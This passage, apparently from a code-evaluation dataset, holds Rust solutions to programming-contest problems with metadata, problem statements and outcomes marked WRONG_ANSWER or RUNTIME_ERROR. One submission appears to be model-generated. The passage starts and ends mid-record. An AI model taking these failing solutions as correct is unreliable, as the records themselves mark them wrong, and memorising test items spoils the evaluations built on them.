x;\r\n            while a[r] - x > max {\r\n                rsum += a[r];\r\n                r -= 1;\r\n            }\r\n            let op = x * l - lsum + rsum - (n - 1 - r) * (x + max);\r\n            if op <= k {\r\n                return true;\r\n            }\r\n        }\r\n        false\r\n    };\r\n\r\n    let (mut low, mut high) = (0, a[n - 1] - a[0]);\r\n    while low < high {\r\n        let mid = (high - low)\/2 + low;\r\n        if check(mid) {\r\n            high = mid;\r\n        } else {\r\n            low = mid + 1;\r\n        }\r\n    }\r\n\r\n    println!(\"{}\", high);\r\n}\r\n\r\n\r\nmod io {\r\n    use std::cell::RefCell;\r\n    use std::io::*;\r\n\r\n    std::thread_local! {\r\n        pub static STDIN: RefCell<Stdin> = RefCell::new(stdin());\r\n        pub static STDOUT: RefCell<BufWriter<Stdout>> = RefCell::new(BufWriter::new(stdout()));\r\n    }\r\n\r\n    #[macro_export]\r\n    macro_rules! input {\r\n        () => {};\r\n        (mut $var:ident: $t:tt, $($rest:tt)*) => {\r\n            let mut $var = __input_inner!($t);\r\n            input!($($rest)*)\r\n        };\r\n        ($var:ident: $t:tt, $($rest:tt)*) => {\r\n            let $var = __input_inner!($t);\r\n            input!($($rest)*)\r\n        };\r\n        (mut $var:ident: $t:tt) => {\r\n            let mut $var = __input_inner!($t);\r\n        };\r\n        ($var:ident: $t:tt) => {\r\n            let $var = __input_inner!($t);\r\n        };\r\n    }\r\n\r\n    #[macro_export]\r\n    macro_rules! __input_inner {\r\n        (($($t:tt),*)) => {\r\n            ($(__input_inner!($t)),*)\r\n        };\r\n        ([$t:tt; $n:expr]) => {\r\n            (0..$n).map(|_| __input_inner!($t)).collect::<Vec<_>>()\r\n        };\r\n        ([$t:tt]) => {{\r\n            let n = __input_inner!(usize);\r\n            (0..n).map(|_| __input_inner!($t)).collect::<Vec<_>>()\r\n        }};\r\n        (chars) => {\r\n            __input_inner!(String).chars().collect::<Vec<_>>()\r\n        };\r\n        (bytes) => {\r\n            __input_inner!(String).into_bytes()\r\n        };\r\n        (usize1) => {\r\n            __input_inner!(usize) - 1\r\n        };\r\n        ($t:ty) => {\r\n            $crate::io::STDIN.with(|r| {\r\n                use std::io::BufRead;\r\n                let r = r.borrow_mut();\r\n                let mut r = r.lock();\r\n                let mut s = vec![];\r\n                loop {\r\n                    let buf = r.fill_buf().unwrap();\r\n                    if buf.is_empty() {\r\n                        break;\r\n                    }\r\n                    if let Some(i) = buf.iter().position(u8::is_ascii_whitespace) {\r\n                        s.extend_from_slice(&buf[..i]);\r\n                        r.consume(i + 1);\r\n                        if !s.is_empty() {\r\n                            break;\r\n                        }\r\n                    } else {\r\n                        s.extend_from_slice(buf);\r\n                        let n = buf.len();\r\n                        r.consume(n);\r\n                    }\r\n                }\r\n                std::str::from_utf8(&s).unwrap().parse::<$t>().unwrap()\r\n            })\r\n        };\r\n    }\r\n\r\n    #[macro_export]\r\n    macro_rules! println {\r\n        () => {\r\n            $crate::io::STDOUT.with(|w| {\r\n                use std::io::Write;\r\n                std::writeln!(w.borrow_mut()).unwrap()\r\n            })\r\n        };\r\n        ($($arg:tt)*) => {\r\n            $crate::io::STDOUT.with(|w| {\r\n                use std::io::Write;\r\n                std::writeln!(w.borrow_mut(), $($arg)*).unwrap()\r\n            })\r\n        };\r\n    }\r\n\r\n    #[macro_export]\r\n    macro_rules! print {\r\n        ($($arg:tt)*) => {\r\n            $crate::io::STDOUT.with(|w| {\r\n                use std::io::Write;\r\n                std::write!(w.borrow_mut(), $($arg)*).unwrap()\r\n            })\r\n        };\r\n    }\r\n\r\n    #[macro_export]\r\n    macro_rules! flush {\r\n        () => {\r\n            $crate::io::STDOUT.with(|w| {\r\n                use std::io::Write;\r\n                w.borrow_mut().flush().unwrap()\r\n            })\r\n        };\r\n    }\r\n}","description":"You are given a sequence $$$a_1, a_2, \\dots, a_n$$$ consisting of $$$n$$$ integers.You may perform the following operation on this sequence: choose any element and either increase or decrease it by one.Calculate the minimum possible difference between the maximum element and the minimum element in the sequence, if you can perform the aforementioned operation no more than $$$k$$$ times.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ $$$(2 \\le n \\le 10^{5}, 1 \\le k \\le 10^{14})$$$ \u2014 the number of elements in the sequence and the maximum number of times you can perform the operation, respectively.\nThe second line contains a sequence of integers $$$a_1, a_2, \\dots, a_n$$$ $$$(1 \\le a_i \\le 10^{9})$$$.\n","output_spec":"Print the minimum possible difference between the maximum element and the minimum element in the sequence, if you can perform the aforementioned operation no more than $$$k$$$ times.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1800,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"1267_L","submission_id":"139874992","tags":["constructive+algorithms","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#[allow(unused_imports)]\r\nuse std::cmp::*;\r\n#[allow(unused_imports)]\r\nuse std::collections::*;\r\n#[allow(unused_imports)]\r\nuse std::io;\r\n#[allow(unused_imports)]\r\nuse std::iter::*;\r\n#[allow(unused_imports)]\r\nuse std::mem::*;\r\n#[allow(unused_imports)]\r\nuse std::str::*;\r\n#[allow(unused_imports)]\r\nuse std::usize;\r\n\r\n\/\/ vec with some initial value\r\n#[allow(unused_macros)]\r\nmacro_rules! vvec {\r\n    ($($x:expr),+; $y:expr; $n:expr) => {{\r\n        let mut v = vec![$y; $n];\r\n\r\n        let mut it = v.iter_mut();\r\n        $(\r\n            *it.next().unwrap() = $x;\r\n        )+\r\n\r\n        v\r\n    }}\r\n}\r\n\r\n#[allow(unused_macros)]\r\nmacro_rules! it {\r\n    ($x:expr) => {\r\n        once($x)\r\n    };\r\n    ($first:expr,$($x:expr),+) => {\r\n        once($first).chain(\r\n            it!($($x),+)\r\n        )\r\n    }\r\n}\r\n\r\n#[allow(unused_macros)]\r\nmacro_rules! pushed {\r\n    ($c:expr, $x:expr) => {{\r\n        let mut c = $c;\r\n        c.push($x);\r\n        c\r\n    }};\r\n}\r\n\r\n#[allow(unused_macros)]\r\nmacro_rules! inserted {\r\n    ($c:expr, $($x:expr),*) => {{\r\n        let mut c = $c;\r\n        c.insert($($x),*);\r\n        c\r\n    }};\r\n}\r\n\r\n#[allow(unused_macros)]\r\nmacro_rules! read_tuple {\r\n    ($($t:ty),+) => {{\r\n        let mut line = String::new();\r\n        io::stdin().read_line(&mut line).unwrap();\r\n\r\n        let mut it = line.trim()\r\n            .split_whitespace();\r\n\r\n        ($(\r\n            it.next().unwrap().parse::<$t>().ok().unwrap()\r\n        ),+)\r\n    }}\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read<T: FromStr>() -> T {\r\n    let mut line = String::new();\r\n    io::stdin().read_line(&mut line).unwrap();\r\n    line.trim().to_string().parse().ok().unwrap()\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read_str() -> Vec<char> {\r\n    read::<String>().chars().collect()\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read_row<T: FromStr>() -> Vec<T> {\r\n    let mut line = String::new();\r\n    io::stdin().read_line(&mut line).unwrap();\r\n\r\n    line.trim()\r\n        .split_whitespace()\r\n        .map(|s| s.parse().ok().unwrap())\r\n        .collect()\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read_col<T: FromStr>(n: usize) -> Vec<T> {\r\n    (0..n).map(|_| read()).collect()\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read_mat<T: FromStr>(n: usize) -> Vec<Vec<T>> {\r\n    (0..n).map(|_| read_row()).collect()\r\n}\r\n\r\n#[allow(dead_code)]\r\nfn read_vec<R, F: FnMut() -> R>(n: usize, mut f: F) -> Vec<R> {\r\n    (0..n).map(|_| f()).collect()\r\n}\r\n\r\ntrait IterCopyExt<'a, T>: IntoIterator<Item = &'a T> + Sized\r\nwhere\r\n    T: 'a + Copy,\r\n{\r\n    fn citer(self) -> std::iter::Copied<Self::IntoIter> {\r\n        self.into_iter().copied()\r\n    }\r\n}\r\n\r\nimpl<'a, T, I> IterCopyExt<'a, T> for I\r\nwhere\r\n    I: IntoIterator<Item = &'a T>,\r\n    T: 'a + Copy,\r\n{\r\n}\r\n\r\ntrait IteratorExt: Iterator + Sized {\r\n    fn sorted(self) -> <std::vec::Vec<Self::Item> as IntoIterator>::IntoIter\r\n    where\r\n        Self::Item: std::cmp::Ord,\r\n    {\r\n        let mut v = self.collect::<Vec<_>>();\r\n        v.sort();\r\n        v.into_iter()\r\n    }\r\n\r\n    fn sorted_by<F>(self, f: F) -> <std::vec::Vec<Self::Item> as IntoIterator>::IntoIter\r\n    where\r\n        F: FnMut(&Self::Item, &Self::Item) -> std::cmp::Ordering,\r\n    {\r\n        let mut v = self.collect::<Vec<_>>();\r\n        v.sort_by(f);\r\n        v.into_iter()\r\n    }\r\n\r\n    fn sorted_by_key<F, K>(self, f: F) -> <std::vec::Vec<Self::Item> as IntoIterator>::IntoIter\r\n    where\r\n        F: FnMut(&Self::Item) -> K,\r\n        K: std::cmp::Ord,\r\n    {\r\n        let mut v = self.collect::<Vec<_>>();\r\n        v.sort_by_key(f);\r\n        v.into_iter()\r\n    }\r\n\r\n    fn join(self, delim: &str) -> String\r\n    where\r\n        Self::Item: ToString,\r\n    {\r\n        self.enumerate().fold(String::new(), |s, (i, t)| {\r\n            if i == 0 {\r\n                s + &t.to_string()\r\n            } else {\r\n                s + delim + &t.to_string()\r\n            }\r\n        })\r\n    }\r\n}\r\n\r\nimpl<I> IteratorExt for I where I: Iterator {}\r\n\r\nfn main() {\r\n    const M: usize = 'z' as usize - 'a' as usize + 1;\r\n\r\n    let (n, l, k) = read_tuple!(usize, usize, usize);\r\n    let s = read_str();\r\n    let nums = s.citer().fold(vec![0; M], |mut nums, c| {\r\n        nums[c as usize - 'a' as usize] += 1;\r\n        nums\r\n    });\r\n\r\n    let (words, ..) = nums.citer().enumerate().fold(\r\n        (vec![vec![]; n], 0, 0, 0),\r\n        |(mut words, i, st, j), (c, m)| {\r\n            let (mut mm, i1, st1) = (i..l)\r\n                .flat_map(|ii| (st..k).map(move |p| (ii, p)))\r\n                .take(m)\r\n                .fold((m, l, 0), |(mm, _, _), (ii, p)| {\r\n                    words[p].push((c + 'a' as usize) as u8 as char);\r\n\r\n                    (\r\n                        mm - 1,\r\n                        ii + (p + 1 - st) \/ (k - st),\r\n                        (p + 1 - st) % (k - st) + st,\r\n                    )\r\n                });\r\n\r\n            for jj in j..n {\r\n                while words[jj].len() < l {\r\n                    if mm == 0 {\r\n                        return (words, i1, st1, jj);\r\n                    }\r\n\r\n                    words[jj].push((c + 'a' as usize) as u8 as char);\r\n                    mm -= 1;\r\n                }\r\n            }\r\n\r\n            return (words, i1, st1, n);\r\n        },\r\n    );\r\n\r\n    use io::{BufWriter, Write};\r\n    let stdout = io::stdout();\r\n    let mut stdout = BufWriter::new(stdout.lock());\r\n    for word in words {\r\n        writeln!(stdout, \"{}\", word.citer().join(\"\")).unwrap();\r\n    }\r\n}\r\n","description":"Lucy likes letters. She studied the definition of the lexicographical order at school and plays with it.At first, she tried to construct the lexicographically smallest word out of given letters. It was so easy! Then she tried to build multiple words and minimize one of them. This was much harder!Formally, Lucy wants to make $$$n$$$ words of length $$$l$$$ each out of the given $$$n \\cdot l$$$ letters, so that the $$$k$$$-th of them in the lexicographic order is lexicographically as small as possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers $$$n$$$, $$$l$$$, and $$$k$$$ ($$$1\\\\le k \\\\le n \\\\le 1\\\\,000$$$; $$$1 \\\\le l \\\\le 1\\\\,000$$$)\u00a0\u2014 the total number of words, the length of each word, and the index of the word Lucy wants to minimize.\nThe next line contains a string of $$$n \\\\cdot l$$$ lowercase letters of the English alphabet.\n","output_spec":"Output $$$n$$$ words of $$$l$$$ letters each, one per line, using the letters from the input. Words must be sorted in the lexicographic order, and the $$$k$$$-th of them must be lexicographically as small as possible. If there are multiple answers with the smallest $$$k$$$-th word, output any of them.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1800,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"1283_E","submission_id":"196330737","tags":["dp","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(dead_code)]\n#![allow(unused)]\n\/\/ mod tree;\n\/\/ mod dsu;\n\/\/ mod binary_lifting;\n\n\nuse std::{env, fs, io, iter, mem, ops, ptr, thread, time, usize};\nuse std::borrow::{Borrow, BorrowMut};\nuse std::cell::{Cell, Ref, RefCell, RefMut, UnsafeCell};\n\nuse std::fmt::format;\nuse std::fs::read;\nuse std::hash::{Hash, Hasher};\nuse std::io::{BufWriter, stdin, stdout, StdoutLock, Write};\nuse std::mem::{ManuallyDrop, MaybeUninit};\nuse std::ops::Bound::Included;\nuse std::process::{id, Output};\nuse std::rc::{Rc, Weak};\nuse std::slice::Iter;\nuse std::str::FromStr;\n\n\nconst P: u64 = 342325337;\n\nfn scan<T: std::str::FromStr>() -> T\n{\n    static mut BUFFER: Vec<String> = vec![];\n    loop {\n        if let Some(token) = unsafe { BUFFER.pop() } {\n            return token.parse().ok().unwrap();\n        }\n        let mut input = String::new();\n        std::io::stdin().read_line(&mut input).ok();\n        unsafe { BUFFER = input.split_whitespace().rev().map(String::from).collect(); }\n    }\n}\n\n\/\/ fn solve<W: Write>(w: &mut W) {\n\/\/\n\/\/ }\n\/\/ fn main() {\n\/\/\n\/\/     let stdout = io::stdout();\n\/\/     let mut writer = io::BufWriter::new(stdout.lock());\n\/\/     let mut n: usize = 1;\n\/\/     if multi {\n\/\/         n = scan();\n\/\/     }\n\/\/     for _ in 0..n {\n\/\/         solve(&mut writer);\n\/\/     }\n\/\/ }\n\nstruct Solution {\n\n}\n\n#[derive(PartialEq, Eq, Clone, Debug)]\npub struct ListNode {\n    pub val: i32,\n    pub next: Option<Box<ListNode>>\n}\n\nimpl ListNode {\n    #[inline]\n    fn new(val: i32) -> Self {\n        ListNode {\n            next: None,\n            val\n        }\n    }\n}\n\n\n\/\/ Definition for a binary tree node.\n#[derive(Debug, PartialEq, Eq)]\npub struct TreeNode {\n    pub val: i32,\n    pub left: Option<Rc<RefCell<TreeNode>>>,\n    pub right: Option<Rc<RefCell<TreeNode>>>,\n}\n\nimpl TreeNode {\n    #[inline]\n    pub fn new(val: i32) -> Self {\n        TreeNode {\n            val,\n            left: None,\n            right: None\n        }\n    }\n}\n\n\nconst MULTI: bool = false;\n\nuse std::collections::{BinaryHeap, BTreeMap, BTreeSet, HashMap, HashSet, LinkedList, VecDeque};\nuse std::cmp::{max, min, Ordering, Reverse};\nuse std::time::UNIX_EPOCH;\n\n\n\nfn solve<W: Write>(w: &mut W) {\n    let n: usize = scan();\n    let mut x: Vec<usize> = vec![];\n    for i in 0..n {\n        x.push(scan());\n    }\n    x.sort();\n\n    let mut ans_min = 1;\n    let mut ans_max = 1;\n\n    let mut min_set = HashSet::new();\n    for i in 0..n {\n        if x[i] == x[n - 1] {\n            if !min_set.contains(&x[i]) && !min_set.contains(&(x[i] - 1)) {\n                min_set.insert(x[i]);\n            }\n        } else {\n            if !min_set.contains(&x[i]) && !min_set.contains(&(x[i] + 1)) {\n                min_set.insert(x[i] + 1);\n            }\n        }\n    }\n\n    let mut max_set = HashSet::new();\n    for i in 0..n {\n        if !max_set.contains(&(x[i] - 1)) {\n            max_set.insert(x[i] - 1);\n            continue;\n        }\n        if !max_set.contains(&x[i]) {\n            max_set.insert(x[i]);\n            continue;\n        }\n        if !max_set.contains(&(x[i] + 1)) {\n            max_set.insert(x[i] + 1);\n            continue;\n        }\n    }\n\n    writeln!(w, \"{} {}\", min_set.len(), max_set.len());\n}\n\nfn main() {\n\n    let stdout = io::stdout();\n    let mut writer = io::BufWriter::new(stdout.lock());\n    let mut n: usize = 1;\n    if MULTI {\n        n = scan();\n    }\n    for _ in 0..n {\n        solve(&mut writer);\n    }\n}\n\n\n\n\/*\n\n\n *\/\n","description":"Oh, New Year. The time to gather all your friends and reflect on the heartwarming events of the past year...$$$n$$$ friends live in a city which can be represented as a number line. The $$$i$$$-th friend lives in a house with an integer coordinate $$$x_i$$$. The $$$i$$$-th friend can come celebrate the New Year to the house with coordinate $$$x_i-1$$$, $$$x_i+1$$$ or stay at $$$x_i$$$. Each friend is allowed to move no more than once.For all friends $$$1 \\le x_i \\le n$$$ holds, however, they can come to houses with coordinates $$$0$$$ and $$$n+1$$$ (if their houses are at $$$1$$$ or $$$n$$$, respectively).For example, let the initial positions be $$$x = [1, 2, 4, 4]$$$. The final ones then can be $$$[1, 3, 3, 4]$$$, $$$[0, 2, 3, 3]$$$, $$$[2, 2, 5, 5]$$$, $$$[2, 1, 3, 5]$$$ and so on. The number of occupied houses is the number of distinct positions among the final ones.So all friends choose the moves they want to perform. After that the number of occupied houses is calculated. What is the minimum and the maximum number of occupied houses can there be?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^5$$$) \u2014 the number of friends.\nThe second line contains $$$n$$$ integers $$$x_1, x_2, \\dots, x_n$$$ ($$$1 \\le x_i \\le n$$$) \u2014 the coordinates of the houses of the friends.\n","output_spec":"Print two integers \u2014 the minimum and the maximum possible number of occupied houses after all moves are performed.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":1700,"lang":"Rust","lang_cluster":"rust","src_uid":"183_A","submission_id":"gpt3_183_A_2","tags":["constructive+algorithms","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\n\nuse std::collections::HashSet;\nuse std::io::{self, BufRead};\n\nfn main() {\n    let stdin = io::stdin();\n    let mut lines = stdin.lock().lines().map(|x| x.unwrap());\n    let n: usize = lines.next().unwrap().parse().unwrap();\n    \n    let mut possible_moves: Vec<String> = Vec::new();\n    for _ in 0..n {\n        possible_moves.push(lines.next().unwrap());\n    }\n    \n    let mut possible_positions: HashSet<(i32, i32)> = HashSet::new();\n    possible_positions.insert((0, 0));\n    \n    for moves in possible_moves {\n        let mut new_positions: HashSet<(i32, i32)> = HashSet::new();\n        for position in possible_positions {\n            let (x, y) = position;\n            match moves.as_str() {\n                \"UL\" => {\n                    new_positions.insert((x - 1, y));\n                    new_positions.insert((x, y + 1));\n                }\n                \"UR\" => {\n                    new_positions.insert((x + 1, y));\n                    new_positions.insert((x, y + 1));\n                }\n                \"DL\" => {\n                    new_positions.insert((x - 1, y));\n                    new_positions.insert((x, y - 1));\n                }\n                \"DR\" => {\n                    new_positions.insert((x + 1, y));\n                    new_positions.insert((x, y - 1));\n                }\n                \"ULDR\" => {\n                    new_positions.insert((x - 1, y));\n                    new_positions.insert((x + 1, y));\n                    new_positions.insert((x, y + 1));\n                    new_positions.insert((x, y - 1));\n                }\n                _ => panic!(\"Invalid movement string\"),\n            }\n        }\n        possible_positions = new_positions;\n    }\n    \n    println!(\"{}\", possible_positions.len());\n}\n","description":"Sensation, sensation in the two-dimensional kingdom! The police have caught a highly dangerous outlaw, member of the notorious \"Pihters\" gang. The law department states that the outlaw was driving from the gang's headquarters in his car when he crashed into an ice cream stall. The stall, the car, and the headquarters each occupies exactly one point on the two-dimensional kingdom.The outlaw's car was equipped with a GPS transmitter. The transmitter showed that the car made exactly n movements on its way from the headquarters to the stall. A movement can move the car from point (x,y) to one of these four points: to point (x-1,y) which we will mark by letter \"L\", to point (x+1,y) \u2014 \"R\", to point (x,y-1) \u2014 \"D\", to point (x,y+1) \u2014 \"U\".The GPS transmitter is very inaccurate and it doesn't preserve the exact sequence of the car's movements. Instead, it keeps records of the car's possible movements. Each record is a string of one of these types: \"UL\", \"UR\", \"DL\", \"DR\" or \"ULDR\". Each such string means that the car made a single movement corresponding to one of the characters of the string. For example, string \"UL\" means that the car moved either \"U\", or \"L\".You've received the journal with the outlaw's possible movements from the headquarters to the stall. The journal records are given in a chronological order. Given that the ice-cream stall is located at point (0,0), your task is to print the number of different points that can contain the gang headquarters (that is, the number of different possible locations of the car's origin).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2264n\u22642\u00b710^5) \u2014 the number of the car's movements from the headquarters to the stall.\nEach of the following n lines describes the car's possible movements. It is guaranteed that each possible movement is one of the following strings: \"UL\", \"UR\", \"DL\", \"DR\" or \"ULDR\". \nAll movements are given in chronological order. \nPlease do not use the %lld specifier to read or write 64-bit integers in C++. It is preferred to use the cin and cout stream or the %I64d specifier.\n","output_spec":"Print a single integer \u2014 the number of different possible locations of the gang's headquarters.\n","notes":"The figure below shows the nine possible positions of the gang headquarters from the first sample: \n \nFor example, the following movements can get the car from point (1,0) to point (0,0): \n \n","sample_inputs":["3\nUR\nUL\nULDR\n","2\nDR\nDL\n"],"sample_outputs":["9\n","4\n"]}
{"difficulty":1600,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"28_B","submission_id":"169356363","tags":["dfs+and+similar","dsu","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"macro_rules! stdin_to {\r\n    ($name: ident: &str) => { let mut s = String::new(); std::io::stdin().read_line(&mut s).unwrap(); s = remove_linebreak(&s).to_string(); let $name = s; };\r\n    ($name: ident: $t: ty) => { let mut s = String::new(); std::io::stdin().read_line(&mut s).unwrap(); s = remove_linebreak(&s).to_string(); let $name = s.parse::<$t>().unwrap(); };\r\n}\r\nmacro_rules! stdin_to_vec {\r\n    ($name: ident: &str, $spl: tt) => { stdin_to!(line: &str); let $name = line.split($spl).map(|s| s.to_string()).collect::<Vec<_>>(); };\r\n    ($name: ident: $t: ty, $spl: tt) => { stdin_to!(line: &str); let $name = line.split($spl).map(|s| s.parse::<$t>().unwrap()).collect::<Vec<_>>(); };\r\n}\r\nfn remove_linebreak(s: &str) -> &str { s.strip_suffix(\"\\r\\n\").or(s.strip_suffix(\"\\n\")).unwrap_or(s) }\r\n\r\nfn main() {\r\n    stdin_to!(n: usize);\r\n}","description":"One day n cells of some array decided to play the following game. Initially each cell contains a number which is equal to it's ordinal number (starting from 1). Also each cell determined it's favourite number. On it's move i-th cell can exchange it's value with the value of some other j-th cell, if |i-j|=di, where di is a favourite number of i-th cell. Cells make moves in any order, the number of moves is unlimited.The favourite number of each cell will be given to you. You will also be given a permutation of numbers from 1 to n. You are to determine whether the game could move to this state.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains positive integer n (1\u2264n\u2264100) \u2014 the number of cells in the array. The second line contains n distinct integers from 1 to n \u2014 permutation. The last line contains n integers from 1 to n \u2014 favourite numbers of the cells.\n","output_spec":"If the given state is reachable in the described game, output YES, otherwise NO.\n","notes":null,"sample_inputs":["5\n5 4 3 2 1\n1 1 1 1 1\n","7\n4 3 5 1 2 7 6\n4 6 6 1 6 6 1\n","7\n4 2 5 1 3 7 6\n4 6 6 1 6 6 1\n"],"sample_outputs":["YES\n","NO\n","YES\n"]}
{"difficulty":2000,"lang":"Rust","lang_cluster":"rust","src_uid":"31be4d38a8b5ea8738a65bfee24a5a21","submission_id":"c5926301997daa40305a86d08f6d2fbf","tags":["brute force","constructive algorithms","greedy","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8 \u3088\u308a\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, bytes) => {\n        read_value!($iter, String).bytes().collect::<Vec<u8>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/\n\nuse std::io::Write;\n\nfn run() {\n    let out = std::io::stdout();\n    let mut out = std::io::BufWriter::new(out.lock());\n    input! {\n        n: usize,\n        s: [chars; n],\n    }\n\/\/    let mut p = 0;\n    let mut map = std::collections::BTreeMap::new();\n    for n in (1989i64..).take(100000) {\n        let mut key = vec![];\n        let mut d = 1;\n        loop {\n            key.insert(0, n \/ d % 10);\n            d *= 10;\n            let mut s = String::new();\n            for k in key.iter() {\n                s.push_str(&format!(\"{}\", *k));\n            }\n            if map.contains_key(&s) {\n                continue;\n            }\n            \/*\n            if n != s.parse::<i64>().unwrap() {\n                if p == 0 {\n                    p = n;\n                }\n            } else if p > 0 {\n                println!(\"{} {}\", p, n);\n                p = 0;\n            }\n            *\/\n            map.insert(s, n);\n            break;\n        }\n    }\n    let solve = |n: String| -> String {\n        if let Some(v) = map.get(&n) {\n            return format!(\"{}\", v);\n        }\n        let v = n.parse::<i64>().unwrap();\n        let q = v \/ 10000;\n        let r = v % 10000;\n        let mut cond = format!(\"{}\", q).len() + 4 < n.len();\n        cond |= format!(\"{}\", q).chars().all(|c| c == '1') && r < 3099;\n        if cond {\n            let d = 10i64.pow(n.len() as u32);\n            format!(\"{}\", v + d)\n        } else {\n            n\n        }\n    };\n    for s in s {\n        let n = s[4..].iter().cloned().collect::<String>();\n        let ans = solve(n);\n        writeln!(out, \"{}\", ans).ok();\n    }\n}\n\nfn main() {\n    run();\n}\n","description":"International Abbreviation Olympiad takes place annually starting from 1989. Each year the competition receives an abbreviation of form IAO'y, where y stands for some number of consequent last digits of the current year. Organizers always pick an abbreviation with non-empty string y that has never been used before. Among all such valid abbreviations they choose the shortest one and announce it to be the abbreviation of this year's competition.For example, the first three Olympiads (years 1989, 1990 and 1991, respectively) received the abbreviations IAO'9, IAO'0 and IAO'1, while the competition in 2015 received an abbreviation IAO'15, as IAO'5 has been already used in 1995.You are given a list of abbreviations. For each of them determine the year it stands for.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000)\u00a0\u2014 the number of abbreviations to process.  Then n lines follow, each containing a single abbreviation. It's guaranteed that each abbreviation contains at most nine digits.","output_spec":"For each abbreviation given in the input, find the year of the corresponding Olympiad.","notes":null,"sample_inputs":["5\nIAO'15\nIAO'2015\nIAO'1\nIAO'9\nIAO'0","4\nIAO'9\nIAO'99\nIAO'999\nIAO'9999"],"sample_outputs":["2015\n12015\n1991\n1989\n1990","1989\n1999\n2999\n9999"]}
{"difficulty":2000,"lang":"Rust","lang_cluster":"rust","src_uid":"391c2abbe862139733fcb997ba1629b8","submission_id":"7313a2d6c92652bcc206e4a748f8d358","tags":["dp","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(unused_imports)]\n#![allow(unused_macros)]\nuse std::cell::{RefCell, RefMut};\nuse std::cmp::{max, min};\nuse std::collections::*;\nuse std::io::{stdin, Read};\n\n#[allow(unused_macros)]\nmacro_rules! parse {\n    ($it: ident ) => {};\n    ($it: ident, ) => {};\n    ($it: ident, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = parse_val!($it, $t);\n        parse!($it $($r)*);\n    };\n    ($it: ident, mut $var:ident : $t:tt $($r:tt)*) => {\n        let mut $var = parse_val!($it, $t);\n        parse!($it $($r)*);\n    };\n    ($it: ident, $var:ident $($r:tt)*) => {\n        let $var = parse_val!($it, usize);\n        parse!($it $($r)*);\n    };\n}\n\n#[allow(unused_macros)]\nmacro_rules! parse_val {\n    ($it: ident, [$t:tt; $len:expr]) => {\n        (0..$len).map(|_| parse_val!($it, $t)).collect::<Vec<_>>();\n    };\n    ($it: ident, ($($t: tt),*)) => {\n        ($(parse_val!($it, $t)),*)\n    };\n    ($it: ident, u1) => {\n        $it.next().unwrap().parse::<usize>().unwrap() -1\n    };\n    ($it: ident, $t: ty) => {\n        $it.next().unwrap().parse::<$t>().unwrap()\n    };\n}\n\n#[cfg(debug_assertions)]\nmacro_rules! debug {\n    ($( $args:expr ),*) => { eprintln!( $( $args ),* ); }\n}\n\n#[cfg(not(debug_assertions))]\nmacro_rules! debug {\n    ($( $args:expr ),*) => {\n        ()\n    };\n}\n\nconst S: usize = 26;\nfn solve(s: &str) {\n    let mut it = s.split_whitespace();\n    let s: Vec<_> = it.next().unwrap().bytes().map(|x| x - b'A').collect();\n    let t: Vec<_> = it.next().unwrap().bytes().map(|x| x - b'A').collect();\n    let v: Vec<_> = it.next().unwrap().bytes().map(|x| x - b'A').collect();\n    let mut next = vec![[0; S]; v.len()];\n    for i in 0..v.len() {\n        for j in 0u8..(S as u8) {\n            let mut curs = v[..i].to_vec();\n            curs.push(j);\n            let mut curs: &[u8] = &curs;\n            while curs != &v[..curs.len()] {\n                curs = &curs[1..];\n            }\n            next[i][j as usize] = curs.len();\n        }\n    }\n    let mut dp = vec![vec![vec![0; v.len()]; t.len() + 1]; s.len() + 1];\n    for i in 0..s.len() {\n        for j in 0..t.len() {\n            for k in 0..v.len() {\n                let _m = next[k][s[i] as usize];\n                if s[i] == t[j] && _m != v.len() {\n                    let m = _m;\n                    dp[i + 1][j + 1][m] = max(dp[i + 1][j + 1][m], dp[i][j][k] + 1);\n                    if i == 10 {}\n                } else {\n                    dp[i + 1][j + 1][k] = 